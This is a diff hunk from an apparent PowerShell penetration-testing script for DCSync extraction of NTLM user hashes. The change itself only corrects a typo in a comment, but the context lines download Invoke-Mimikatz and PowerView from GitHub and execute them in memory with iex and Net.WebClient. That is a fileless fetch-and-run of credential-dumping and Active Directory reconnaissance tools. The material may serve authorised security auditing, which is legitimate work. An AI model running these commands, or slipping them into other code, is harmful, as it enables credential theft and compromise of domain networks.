@@ -13,7 +13,7 @@ $IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import_FINAL" + $EXT
 Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/nishang/master/Gather/Invoke-Mimikatz.ps1')
 
-# download poweview into memory
+# download powerview into memory
 Write-Host "[INFO] Downloading PowerView into Memory" -ForegroundColor Gray
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')
 
